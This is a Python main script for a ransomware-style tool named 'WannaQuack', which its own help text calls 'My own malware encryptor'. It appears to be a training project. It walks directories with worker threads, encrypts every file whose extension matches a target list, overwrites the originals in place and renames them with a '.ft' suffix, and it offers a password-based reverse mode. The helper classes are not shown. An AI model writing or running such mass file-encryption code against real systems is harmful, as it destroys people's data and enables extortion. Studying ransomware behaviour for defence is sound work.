import json
import argparse
from WannaQuack import WannaQuack
from Worker import Worker
from concurrent.futures import as_completed
from pathlib import Path
import os


def init_parser():
    parser = argparse.ArgumentParser(description="My own malware encryptor")
    parser.add_argument(
        "-v", "--version", action="store_true", help="Show version information"
    )
    parser.add_argument(
        "-r", "--reverse", action="store_true", help="Reverse the encryption process"
    )
    parser.add_argument(
        "-s", "--silent", action="store_true", help="Silent mode, no output"
    )
    return parser


def get_all_extentions():
    try:
        with open("file_extensions.json", "r") as f:
            data = json.load(f)
            return set(data)
    except Exception as e:
        print(f"Error: {e}")
        return None


def print_error(e, duck_killer):
    if not duck_killer.silent:
        print(e)


def ask_for_password():
    print("Enter your password:")
    password = input()
    return password


def main():
    parser = init_parser()
    args = parser.parse_args()

    if args.version:
        print("Version 1.0.0")
        return 0

    duck_file_killer = WannaQuack(args)
    duck_file_killer.password = ask_for_password()
    file_extentions = get_all_extentions()
    if not file_extentions:
        return 1

    ret = duck_file_killer.get_all_files()
    if not ret:
        return 1

    futures = [
        duck_file_killer.executor.submit(Worker().run, dir)
        for dir in duck_file_killer.subdir
    ]

    try:
        for f in as_completed(futures):
            try:
                files = f.result()
            except Exception as e:
                print_error(f"Worker error: {e}", duck_file_killer)
                continue

            duck_file_killer.files_path.update(files)

        for file in duck_file_killer.files_path:
            try:
                with open(file, "rb") as f:
                    data = f.read()
                    file_extention = os.path.splitext(file)[1]
                    if args.reverse:
                        print("Decrypting", file_extention)
                        if file_extention != ".ft":
                            continue
                        new_content = duck_file_killer.decrypt(data)
                        out_path = Path(file).with_suffix("")
                    else:
                        if file_extention not in file_extentions:
                            continue
                        new_content = duck_file_killer.encrypt(data)
                        out_path = Path(file)
                        out_path = out_path.with_suffix(out_path.suffix + ".ft")

            except Exception as e:
                print_error(f"File Error on read {e}", duck_file_killer)

            try:
                with open(file, "wb") as f:
                    f.write(new_content)
                    file_path = Path(file)
                    os.replace(file_path, out_path)

            except Exception as e:
                print_error(f"File Error on write {e}", duck_file_killer)
    finally:
        duck_file_killer.executor.shutdown(wait=True, cancel_futures=False)

    return


if __name__ == "__main__":
    main()
